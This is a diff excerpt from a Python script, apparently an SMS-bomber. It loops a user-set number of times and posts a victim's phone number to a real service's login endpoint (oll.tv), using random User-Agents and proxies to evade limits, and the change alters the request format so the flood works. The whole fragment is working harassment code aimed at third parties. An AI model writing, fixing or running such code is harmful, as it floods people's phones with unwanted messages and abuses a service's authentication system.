@@ -49,7 +49,7 @@ run = int(console.input('[green]Введите количество повтор
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
  try:
-         requests.post("https://oll.tv/api/v3/auth/login?lang=rus", data={"login": number}, headers=headers, proxies=proxies)
+         requests.post("https://oll.tv/api/v3/auth/login?lang=rus", json={"login": number}, headers=headers, proxies=proxies)
          print('66666666666')
  except:
          print('Не отправлено (888888888888888)')
